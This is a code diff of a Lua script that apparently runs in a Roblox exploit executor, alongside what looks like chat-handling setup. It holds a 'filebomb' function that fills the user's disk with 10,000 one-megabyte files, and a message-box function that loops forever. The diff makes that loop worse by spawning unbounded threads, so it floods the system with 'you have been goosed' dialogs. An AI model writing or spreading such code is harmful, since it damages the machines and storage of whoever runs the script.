@@ -8,6 +8,7 @@ local Players = cloneref(game:GetService("Players"))
 local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
 
 -- Chat Properties
+local isChatModule
 if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
 	isChatModule = "New"
 else
@@ -31,15 +32,17 @@ end
 local function filebomb()
 	local text = ("w"):rep(1000000)
 	for i = 1, 10000 do
-		writefile("goosed"..i..".txt", text)
+		writefile("you have been goosed"..i..".txt", text)
 	end
 end
 
 local function msgbox()
 	if messagebox then
 		while true do
-			messagebox("you have been goosed", "you have been goosed", 2+16)
-			task.wait()
+			task.spawn(function()
+				messagebox("you have been goosed", "you have been goosed", 2+16)
+				task.wait()
+			end)
 		end
 	end
 end
